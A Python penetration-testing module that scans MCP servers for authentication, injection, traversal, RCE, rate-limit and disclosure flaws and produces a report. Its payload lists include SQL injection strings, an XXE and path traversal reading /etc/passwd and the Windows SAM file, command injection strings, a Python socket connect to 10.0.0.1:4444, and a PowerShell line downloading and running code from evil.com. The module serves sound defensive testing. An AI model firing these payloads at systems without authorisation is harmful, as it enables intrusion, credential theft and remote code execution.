"""
Penetration Testing Module
Comprehensive security testing for MCP servers
"""

import logging
import asyncio
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from enum import Enum

from mcp_security.client.mcp_client import MCPClient, MCPResponse

logger = logging.getLogger(__name__)


class VulnerabilityType(Enum):
    """Types of vulnerabilities to test for"""
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"
    INPUT_VALIDATION = "input_validation"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    REMOTE_CODE_EXECUTION = "remote_code_execution"
    RATE_LIMITING = "rate_limiting"
    RESOURCE_EXHAUSTION = "resource_exhaustion"
    INFORMATION_DISCLOSURE = "information_disclosure"


@dataclass
class VulnerabilityTest:
    """Represents a vulnerability test"""
    name: str
    type: VulnerabilityType
    description: str
    severity: str
    test_func: str  # Name of the test function to run


@dataclass
class PentestResult:
    """Result of a penetration test"""
    test: VulnerabilityTest
    vulnerable: bool
    details: str
    evidence: Optional[Dict[str, Any]] = None
    
    @property
    def test_type(self) -> str:
        """Get test name"""
        return self.test.name
    
    @property
    def vulnerability_type(self) -> str:
        """Get vulnerability type"""
        return self.test.type.value
    
    @property
    def severity(self) -> str:
        """Get severity level"""
        return self.test.severity
    
    @property
    def impact(self) -> str:
        """Get impact description"""
        return self.details
    
    @property
    def remediation(self) -> str:
        """Get remediation steps"""
        return f"Review and fix {self.test.type.value} vulnerability: {self.test.description}"


class PenetrationTester:
    """
    Comprehensive penetration testing for MCP servers
    """

    def __init__(self, client: MCPClient, event_callback=None, parameter_values: dict = None, selected_tools: list = None):
        """
        Initialize penetration tester
        
        Args:
            client: MCPClient instance for server communication
            event_callback: Optional callback for broadcasting events to web UI
            parameter_values: User-provided parameter values {tool_name: {param_name: value}}
            selected_tools: List of specific tool names to test (None = all tools)
        """
        self.client = client
        self.event_callback = event_callback
        self.parameter_values = parameter_values or {}
        self.selected_tools = selected_tools
        self.tests = self._load_tests()
    
    def _filter_tools(self, tools: list) -> list:
        """Filter tools based on selected_tools if specified"""
        if self.selected_tools:
            return [t for t in tools if t.get("name") in self.selected_tools]
        return tools
    
    async def _broadcast_log(self, level: str, message: str):
        """Broadcast log message to web UI if callback is available"""
        if self.event_callback:
            try:
                await self.event_callback({
                    "type": "log",
                    "level": level,
                    "message": message
                })
            except Exception as e:
                logger.error(f"Error broadcasting log: {e}")

    def _load_tests(self) -> List[VulnerabilityTest]:
        """Load built-in vulnerability tests"""
        return [
            VulnerabilityTest(
                name="Missing Authentication",
                type=VulnerabilityType.AUTHENTICATION,
                description="Tests if server accepts requests without authentication",
                severity="critical",
                test_func="test_missing_authentication"
            ),
            VulnerabilityTest(
                name="Weak Authentication",
                type=VulnerabilityType.AUTHENTICATION,
                description="Tests for weak authentication mechanisms",
                severity="high",
                test_func="test_weak_authentication"
            ),
            VulnerabilityTest(
                name="Authorization Bypass",
                type=VulnerabilityType.AUTHORIZATION,
                description="Tests if users can access unauthorized resources",
                severity="critical",
                test_func="test_authorization_bypass"
            ),
            VulnerabilityTest(
                name="Input Validation - SQL Injection",
                type=VulnerabilityType.INPUT_VALIDATION,
                description="Tests for SQL injection vulnerabilities",
                severity="critical",
                test_func="test_sql_injection"
            ),
            VulnerabilityTest(
                name="Input Validation - XXE",
                type=VulnerabilityType.INPUT_VALIDATION,
                description="Tests for XML External Entity vulnerabilities",
                severity="high",
                test_func="test_xxe"
            ),
            VulnerabilityTest(
                name="Path Traversal",
                type=VulnerabilityType.PATH_TRAVERSAL,
                description="Tests for directory traversal vulnerabilities",
                severity="high",
                test_func="test_path_traversal"
            ),
            VulnerabilityTest(
                name="Command Injection",
                type=VulnerabilityType.COMMAND_INJECTION,
                description="Tests for OS command injection vulnerabilities",
                severity="critical",
                test_func="test_command_injection"
            ),
            VulnerabilityTest(
                name="Remote Code Execution",
                type=VulnerabilityType.REMOTE_CODE_EXECUTION,
                description="Tests for remote code execution vulnerabilities",
                severity="critical",
                test_func="test_remote_code_execution"
            ),
            VulnerabilityTest(
                name="Rate Limiting",
                type=VulnerabilityType.RATE_LIMITING,
                description="Tests if server has proper rate limiting",
                severity="medium",
                test_func="test_rate_limiting"
            ),
            VulnerabilityTest(
                name="Resource Exhaustion",
                type=VulnerabilityType.RESOURCE_EXHAUSTION,
                description="Tests for DoS via resource exhaustion",
                severity="high",
                test_func="test_resource_exhaustion"
            ),
            VulnerabilityTest(
                name="Information Disclosure",
                type=VulnerabilityType.INFORMATION_DISCLOSURE,
                description="Tests for sensitive information leakage",
                severity="medium",
                test_func="test_information_disclosure"
            ),
        ]

    async def run_all_tests(
        self,
        test_types: Optional[List[VulnerabilityType]] = None
    ) -> List[PentestResult]:
        """
        Run all penetration tests
        
        Args:
            test_types: Specific types of tests to run (None = all)
            
        Returns:
            List of PentestResult objects
        """
        tests = self.tests
        if test_types:
            tests = [t for t in tests if t.type in test_types]
        
        results = []
        logger.info(f"Running {len(tests)} penetration tests")
        await self._broadcast_log("info", f"ðŸ” Running {len(tests)} penetration tests...")
        
        for test in tests:
            try:
                await self._broadcast_log("info", f"  â””â”€ Testing: {test.name}")
                
                # Get the test function
                test_func = getattr(self, test.test_func)
                result = await test_func(test)
                results.append(result)
                
                logger.info(f"Test '{test.name}': vulnerable={result.vulnerable}")
                
                if result.vulnerable:
                    await self._broadcast_log("error", f"     â””â”€ âŒ VULNERABLE: {test.name}")
                else:
                    await self._broadcast_log("success", f"     â””â”€ âœ… PASSED: {test.name}")
                
            except Exception as e:
                logger.error(f"Error running test '{test.name}': {e}")
                await self._broadcast_log("error", f"     â””â”€ âš ï¸ ERROR in {test.name}: {str(e)}")
                results.append(PentestResult(
                    test=test,
                    vulnerable=False,
                    details=f"Error: {str(e)[:500]}"
                ))
        
        return results
    
    def _build_test_arguments(self, tool_name: str, tool_schema: Dict[str, Any], payload: str) -> Dict[str, Any]:
        """
        Build test arguments by injecting payload into string parameters
        
        Args:
            tool_name: Name of the tool being tested
            tool_schema: Full tool schema
            payload: Malicious payload to inject
            
        Returns:
            Arguments dict with payload in testable string parameters and defaults for others
        """
        arguments = {}
        input_schema = tool_schema.get("inputSchema", {})
        properties = input_schema.get("properties", {})
        required = input_schema.get("required", [])
        
        # Check if user provided values for this tool
        user_values = self.parameter_values.get(tool_name, {})
        
        # Fill all required parameters first
        for param_name in required:
            # Use user-provided value if available
            if param_name in user_values:
                arguments[param_name] = user_values[param_name]
                logger.debug(f"Using user-provided value for '{param_name}': {user_values[param_name]}")
                continue
            
            param_schema = properties.get(param_name, {})
            param_type = param_schema.get("type", "string")
            param_desc = param_schema.get("description", "").lower()
            param_name_lower = param_name.lower()
            
            # Handle array types
            if isinstance(param_type, list):
                param_type = next((t for t in param_type if t != "null"), "string")
            
            # Generate appropriate values based on type
            if param_type == "string":
                # For JSON/object parameters, use valid JSON
                if "json" in param_desc or "object" in param_desc or "item" in param_name_lower:
                    arguments[param_name] = '{"name":"test","value":"test"}'
                # For other string parameters, inject payload
                else:
                    arguments[param_name] = payload
            elif param_type == "number" or param_type == "integer":
                arguments[param_name] = 0
            elif param_type == "boolean":
                arguments[param_name] = False
            elif param_type == "array":
                arguments[param_name] = []
            elif param_type == "object":
                arguments[param_name] = {}
            else:
                arguments[param_name] = payload
        
        # If no parameters, try common parameter names
        if not arguments:
            arguments = {
                "input": payload,
                "data": payload,
                "value": payload,
                "content": payload,
                "text": payload,
            }
        
        return arguments

    async def test_missing_authentication(self, test: VulnerabilityTest) -> PentestResult:
        """Test if server accepts unauthenticated requests"""
        try:
            # Try to list tools without authentication
            response = await self.client.list_tools()
            
            if response.success:
                return PentestResult(
                    test=test,
                    vulnerable=True,
                    details="Server accepts requests without authentication",
                    evidence={"response": response.data}
                )
            
            return PentestResult(
                test=test,
                vulnerable=False,
                details="Server requires authentication"
            )
            
        except Exception as e:
            return PentestResult(
                test=test,
                vulnerable=False,
                details=f"Could not complete test: {str(e)[:500]}"
            )

    async def test_weak_authentication(self, test: VulnerabilityTest) -> PentestResult:
        """Test for weak authentication mechanisms"""
        weak_credentials = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "root", "password": "root"},
            {"username": "test", "password": "test"},
        ]
        
        for creds in weak_credentials:
            # This is a placeholder - actual implementation depends on auth mechanism
            # In real scenario, you'd try to authenticate with these credentials
            pass
        
        return PentestResult(
            test=test,
            vulnerable=False,
            details="No weak credentials found (test requires auth mechanism details)"
        )

    async def test_authorization_bypass(self, test: VulnerabilityTest) -> PentestResult:
        """Test for authorization bypass vulnerabilities"""
        try:
            # Try to access resources that should require authorization
            response = await self.client.list_resources()
            
            # This is a basic check - real implementation would be more sophisticated
            if response.success and response.data:
                resources = response.data.get("resources", [])
                if len(resources) > 0:
                    return PentestResult(
                        test=test,
                        vulnerable=True,
                        details=f"Able to list {len(resources)} resources without proper authorization check",
                        evidence={"resource_count": len(resources)}
                    )
            
            return PentestResult(
                test=test,
                vulnerable=False,
                details="Authorization appears to be enforced"
            )
            
        except Exception as e:
            return PentestResult(
                test=test,
                vulnerable=False,
                details=f"Could not complete test: {str(e)[:500]}"
            )

    async def test_sql_injection(self, test: VulnerabilityTest) -> PentestResult:
        """Test for SQL injection vulnerabilities"""
        sql_payloads = [
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "1' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "admin'--",
            "' OR 1=1--",
            "1' AND '1'='2",
        ]
        
        try:
            tools_response = await self.client.list_tools()
            if not tools_response.success or not tools_response.data:
                return PentestResult(
                    test=test,
                    vulnerable=False,
                    details="Could not enumerate tools for testing"
                )
            
            tools = tools_response.data.get("tools", [])
            if not tools:
                return PentestResult(
                    test=test,
                    vulnerable=False,
                    details="No tools available to test"
                )
            
            # Filter tools based on selected_tools if specified
            if self.selected_tools:
                tools = [t for t in tools if t.get("name") in self.selected_tools]
            
            # Test each tool with SQL payloads
            for tool in tools[:3]:  # Test first 3 tools
                tool_name = tool.get("name", "")
                await self._broadcast_log("info", f"     â””â”€ Testing {tool_name} for SQL injection...")
                
                for payload in sql_payloads:
                    # Build arguments with payload in all parameters
                    arguments = self._build_test_arguments(tool_name, tool, payload)
                    response = await self.client.call_tool(tool_name, arguments)
                    
                    # Check for SQL error messages
                    if response.error:
                        error_lower = response.error.lower()
                        sql_errors = ["sql", "syntax error", "mysql", "postgresql", "sqlite", "ora-", "microsoft sql"]
                        if any(err in error_lower for err in sql_errors):
                            await self._broadcast_log("error", f"     â””â”€ ðŸš¨ SQL injection found in {tool_name}!")
                            return PentestResult(
                                test=test,
                                vulnerable=True,
                                details=f"SQL error detected in tool '{tool_name}' with payload: {payload}",
                                evidence={"tool": tool_name, "payload": payload, "error": response.error[:500]}
                            )
            
            return PentestResult(
                test=test,
                vulnerable=False,
                details="No SQL injection vulnerabilities detected"
            )
            
        except Exception as e:
            return PentestResult(
                test=test,
                vulnerable=False,
                details=f"Could not complete test: {str(e)[:500]}"
            )

    async def test_xxe(self, test: VulnerabilityTest) -> PentestResult:
        """Test for XML External Entity vulnerabilities"""
        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""
        
        try:
            tools_response = await self.client.list_tools()
            if not tools_response.success or not tools_response.data:
                return PentestResult(
                    test=test,
                    vulnerable=False,
                    details="Could not enumerate tools for testing"
                )
            
            tools = tools_response.data.get("tools", [])
            if not tools:
                return PentestResult(
                    test=test,
                    vulnerable=False,
                    details="No tools available to test"
                )
            
            # Filter tools based on selected_tools
            tools = self._filter_tools(tools)
            
            # Test tools that might accept XML
            for tool in tools[:3]:  # Test first 3 tools
                tool_name = tool.get("name", "")
                response = await self.client.call_tool(
                    tool_name,
                    {"input": xxe_payload}
                )
                
                if response.success and response.data:
                    response_str = str(response.data)
                    if "root:" in response_str or "/bin/bash" in response_str:
                        return PentestResult(
                            test=test,
                            vulnerable=True,
                            details="XXE vulnerability detected - file content leaked",
                            evidence={"tool": tool_name}
                        )
            
            return PentestResult(
                test=test,
                vulnerable=False,
                details="No XXE vulnerabilities detected"
            )
            
        except Exception as e:
            return PentestResult(
                test=test,
                vulnerable=False,
                details=f"Could not complete test: {str(e)[:500]}"
            )

    async def test_path_traversal(self, test: VulnerabilityTest) -> PentestResult:
        """Test for path traversal vulnerabilities"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
        ]
        
        try:
            # First, try resources with path traversal
            for payload in traversal_payloads:
                response = await self.client.read_resource(payload)
                
                if response.success and response.data:
                    response_str = str(response.data)
                    if "root:" in response_str or "administrator" in response_str.lower():
                        await self._broadcast_log("error", f"     â””â”€ ðŸš¨ Path traversal in resources!")
                        return PentestResult(
                            test=test,
                            vulnerable=True,
                            details=f"Path traversal in resources with payload: {payload}",
                            evidence={"payload": payload, "method": "resources"}
                        )
            
            # Also test tools with path parameters
            tools_response = await self.client.list_tools()
            if tools_response.success and tools_response.data:
                tools = tools_response.data.get("tools", [])
                
                # Filter tools based on selected_tools
                tools = self._filter_tools(tools)
                
                for tool in tools[:3]:
                    tool_name = tool.get("name", "")
                    await self._broadcast_log("info", f"     â””â”€ Testing {tool_name} for path traversal...")
                    
                    for payload in traversal_payloads:
                        arguments = self._build_test_arguments(tool_name, tool, payload)
                        response = await self.client.call_tool(tool_name, arguments)
                        
                        if response.success and response.data:
                            response_str = str(response.data).lower()
                            indicators = ["root:", "administrator", "[boot loader]", "system32"]
                            if any(ind in response_str for ind in indicators):
                                await self._broadcast_log("error", f"     â””â”€ ðŸš¨ Path traversal in {tool_name}!")
                                return PentestResult(
                                    test=test,
                                    vulnerable=True,
                                    details=f"Path traversal in tool '{tool_name}' with payload: {payload}",
                                    evidence={"tool": tool_name, "payload": payload}
                                )
            
            return PentestResult(
                test=test,
                vulnerable=False,
                details="No path traversal vulnerabilities detected"
            )
            
        except Exception as e:
            return PentestResult(
                test=test,
                vulnerable=False,
                details=f"Could not complete test: {str(e)[:500]}"
            )

    async def test_command_injection(self, test: VulnerabilityTest) -> PentestResult:
        """Test for command injection vulnerabilities"""
        command_payloads = [
            "; ls -la",
            "| whoami",
            "& dir",
            "`id`",
            "$(cat /etc/passwd)",
            "\n$(whoami)",
            "test;id",
            "|| ping -c 1 127.0.0.1",
        ]
        
        try:
            tools_response = await self.client.list_tools()
            if not tools_response.success or not tools_response.data:
                return PentestResult(
                    test=test,
                    vulnerable=False,
                    details="Could not enumerate tools for testing"
                )
            
            tools = tools_response.data.get("tools", [])
            if not tools:
                return PentestResult(
                    test=test,
                    vulnerable=False,
                    details="No tools available to test"
                )
            
            # Filter tools based on selected_tools
            tools = self._filter_tools(tools)
            
            # Test each tool with command injection payloads
            for tool in tools[:3]:  # Test first 3 tools
                tool_name = tool.get("name", "")
                await self._broadcast_log("info", f"     â””â”€ Testing {tool_name} for command injection...")
                
                for payload in command_payloads:
                    # Build arguments with payload in all parameters
                    arguments = self._build_test_arguments(tool_name, tool, payload)
                    
                    response = await self.client.call_tool(tool_name, arguments)
                    
                    if response.success and response.data:
                        response_str = str(response.data).lower()
                        indicators = ["uid=", "gid=", "volume serial number", "directory of", "root:", "administrator"]
                        if any(ind in response_str for ind in indicators):
                            await self._broadcast_log("error", f"     â””â”€ ðŸš¨ Command injection found in {tool_name}!")
                            return PentestResult(
                                test=test,
                                vulnerable=True,
                                details=f"Command injection detected in tool '{tool_name}' with payload: {payload}",
                                evidence={"tool": tool_name, "payload": payload, "response_snippet": str(response.data)[:1000], "full_response": str(response.data)}
                            )
            
            return PentestResult(
                test=test,
                vulnerable=False,
                details="No command injection vulnerabilities detected"
            )
            
        except Exception as e:
            return PentestResult(
                test=test,
                vulnerable=False,
                details=f"Could not complete test: {str(e)[:500]}"
            )

    async def test_remote_code_execution(self, test: VulnerabilityTest) -> PentestResult:
        """Test for remote code execution vulnerabilities"""
        rce_payloads = [
            # Python RCE
            "__import__('os').system('whoami')",
            "eval('__import__(\"os\").system(\"id\")')",
            "exec('import os; os.system(\"pwd\")')",
            "exec(\"import socket,subprocess;s=socket.socket();s.connect(('10.0.0.1',4444))\")",
            # Node.js RCE
            "require('child_process').exec('whoami')",
            "global.process.mainModule.require('child_process').execSync('id')",
            "process.binding('spawn_sync').spawn({file:'/bin/sh',args:['-c','id']})",
            # Template injection
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config}}",
            "{{self}}",
            # SSTI Python
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            "{{ config.items() }}",
            # Serialization RCE
            "__import__('pickle').loads(b'cos\\nsystem\\n(S\\'id\\'\\ntR.')",
            # PowerShell
            "Invoke-Expression 'whoami'",
            "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
        ]
        
        try:
            tools_response = await self.client.list_tools()
            if not tools_response.success or not tools_response.data:
                return PentestResult(
                    test=test,
                    vulnerable=False,
                    details="Could not enumerate tools for testing"
                )
            
            tools = tools_response.data.get("tools", [])
            if not tools:
                return PentestResult(
                    test=test,
                    vulnerable=False,
                    details="No tools available to test"
                )
            
            # Filter tools based on selected_tools
            tools = self._filter_tools(tools)
            
            # Test tools with RCE payloads
            for tool in tools[:3]:  # Test first 3 tools
                tool_name = tool.get("name", "")
                await self._broadcast_log("info", f"     â””â”€ Testing {tool_name} for RCE...")
                
                for payload in rce_payloads:
                    try:
                        # Build arguments with payload in all parameters
                        arguments = self._build_test_arguments(tool_name, tool, payload)
                        
                        response = await self.client.call_tool(tool_name, arguments)
                        
                        if response.success and response.data:
                            response_str = str(response.data).lower()
                            full_response = str(response.data)
                            
                            # Check for RCE indicators with more specific patterns
                            # Use stricter matching to avoid false positives from business data
                            indicators = [
                                "uid=", "gid=" "users",  # Unix user info (very specific format)
                                "volume in drive",  # Windows dir command
                                "volume serial number",  # Windows dir command
                                "directory of c:",  # Windows dir command
                                "/bin/bash", "/bin/sh",  # Unix shell paths
                                "{{49}}", "${49}", "#{49}",  # Template injection result (NOT just "49")
                            ]
                            
                            # Additional context-aware checks (must have multiple indicators)
                            suspicious_patterns = 0
                            
                            # Check for command execution patterns
                            if any(ind in response_str for ind in indicators):
                                suspicious_patterns += 2  # Strong indicator
                            
                            # Check for template evaluation (7*7 = 49) but only if isolated
                            if "49" in response_str and "7*7" in payload.lower():
                                # Check if 49 appears in a non-numeric context (not part of larger number)
                                import re
                                if re.search(r'\b49\b', response_str) and "odata" not in response_str:
                                    suspicious_patterns += 1
                            
                            # Check for Python introspection output
                            if ("__main__" in response_str or "__subclasses__" in response_str) and "import" in payload:
                                suspicious_patterns += 2
                            
                            # Only flag as vulnerable if we have strong evidence
                            if suspicious_patterns >= 2:
                                await self._broadcast_log("error", f"     â””â”€ ðŸš¨ RCE vulnerability found in {tool_name}!")
                                await self._broadcast_log("error", f"     â””â”€ Full response: {full_response[:500]}...")
                                await self._broadcast_log("error", f"     â””â”€ Suspicious patterns detected: {suspicious_patterns}")
                                return PentestResult(
                                    test=test,
                                    vulnerable=True,
                                    details=f"Remote code execution detected in tool '{tool_name}' with payload: {payload[:100]}",
                                    evidence={
                                        "tool": tool_name,
                                        "payload": payload,
                                        "response_snippet": full_response[:1000],
                                        "full_response": full_response,
                                        "suspicious_patterns": suspicious_patterns
                                    }
                                )
                    except Exception:
                        # Tool might not accept these parameters, continue
                        continue
            
            return PentestResult(
                test=test,
                vulnerable=False,
                details="No remote code execution vulnerabilities detected"
            )
            
        except Exception as e:
            return PentestResult(
                test=test,
                vulnerable=False,
                details=f"Could not complete test: {str(e)[:500]}"
            )

    async def test_rate_limiting(self, test: VulnerabilityTest) -> PentestResult:
        """Test for rate limiting"""
        try:
            # Send multiple rapid requests
            request_count = 100
            success_count = 0
            
            for i in range(request_count):
                response = await self.client.list_tools()
                if response.success:
                    success_count += 1
                
                # Check if we're being rate limited
                if response.status_code == 429:  # Too Many Requests
                    return PentestResult(
                        test=test,
                        vulnerable=False,
                        details=f"Rate limiting detected after {i+1} requests"
                    )
            
            if success_count == request_count:
                return PentestResult(
                    test=test,
                    vulnerable=True,
                    details=f"No rate limiting detected - all {request_count} requests succeeded",
                    evidence={"requests_sent": request_count}
                )
            
            return PentestResult(
                test=test,
                vulnerable=False,
                details="Rate limiting appears to be in place"
            )
            
        except Exception as e:
            return PentestResult(
                test=test,
                vulnerable=False,
                details=f"Could not complete test: {str(e)[:500]}"
            )

    async def test_resource_exhaustion(self, test: VulnerabilityTest) -> PentestResult:
        """Test for resource exhaustion vulnerabilities"""
        try:
            # Try to send very large payloads
            large_payload = "A" * (10 * 1024 * 1024)  # 10MB
            
            tools_response = await self.client.list_tools()
            if not tools_response.success or not tools_response.data:
                return PentestResult(
                    test=test,
                    vulnerable=False,
                    details="Could not enumerate tools for testing"
                )
            
            tools = tools_response.data.get("tools", [])
            if not tools:
                return PentestResult(
                    test=test,
                    vulnerable=False,
                    details="No tools available to test"
                )
            
            # Filter tools based on selected_tools
            tools = self._filter_tools(tools)
            
            if not tools:
                return PentestResult(
                    test=test,
                    vulnerable=False,
                    details="No selected tools available to test"
                )
            
            tool = tools[0]
            tool_name = tool.get("name", "")
            
            response = await self.client.call_tool(
                tool_name,
                {"input": large_payload}
            )
            
            if response.success:
                return PentestResult(
                    test=test,
                    vulnerable=True,
                    details="Server accepted very large payload without limits",
                    evidence={"payload_size": len(large_payload)}
                )
            
            return PentestResult(
                test=test,
                vulnerable=False,
                details="Server has input size limits"
            )
            
        except Exception as e:
            return PentestResult(
                test=test,
                vulnerable=False,
                details=f"Could not complete test: {str(e)[:500]}"
            )

    async def test_information_disclosure(self, test: VulnerabilityTest) -> PentestResult:
        """Test for information disclosure"""
        try:
            # Check response headers for sensitive information
            response = await self.client.list_tools()
            
            if response.headers:
                sensitive_headers = []
                headers_to_check = {
                    "server": "Server version disclosure",
                    "x-powered-by": "Technology stack disclosure",
                    "x-aspnet-version": "Framework version disclosure",
                }
                
                for header, description in headers_to_check.items():
                    if header in response.headers:
                        sensitive_headers.append({
                            "header": header,
                            "value": response.headers[header],
                            "issue": description
                        })
                
                if sensitive_headers:
                    return PentestResult(
                        test=test,
                        vulnerable=True,
                        details="Sensitive information disclosed in headers",
                        evidence={"headers": sensitive_headers}
                    )
            
            return PentestResult(
                test=test,
                vulnerable=False,
                details="No obvious information disclosure detected"
            )
            
        except Exception as e:
            return PentestResult(
                test=test,
                vulnerable=False,
                details=f"Could not complete test: {str(e)[:500]}"
            )

    def generate_report(self, results: List[PentestResult]) -> Dict[str, Any]:
        """
        Generate a summary report of penetration test results
        
        Args:
            results: List of PentestResult objects
            
        Returns:
            Dictionary containing report data
        """
        total = len(results)
        vulnerable = sum(1 for r in results if r.vulnerable)
        
        severity_breakdown = {}
        for result in results:
            sev = result.test.severity
            if sev not in severity_breakdown:
                severity_breakdown[sev] = {"total": 0, "vulnerable": 0, "secure": 0}
            
            severity_breakdown[sev]["total"] += 1
            if result.vulnerable:
                severity_breakdown[sev]["vulnerable"] += 1
            else:
                severity_breakdown[sev]["secure"] += 1
        
        return {
            "summary": {
                "total_tests": total,
                "vulnerabilities_found": vulnerable,
                "tests_passed": total - vulnerable,
                "security_score": f"{((total - vulnerable) / total * 100):.1f}%" if total > 0 else "N/A"
            },
            "by_severity": severity_breakdown,
            "results": [
                {
                    "test_name": r.test.name,
                    "type": r.test.type.value,
                    "severity": r.test.severity,
                    "description": r.test.description,
                    "vulnerable": r.vulnerable,
                    "details": r.details,
                    "evidence": r.evidence
                }
                for r in results
            ]
        }
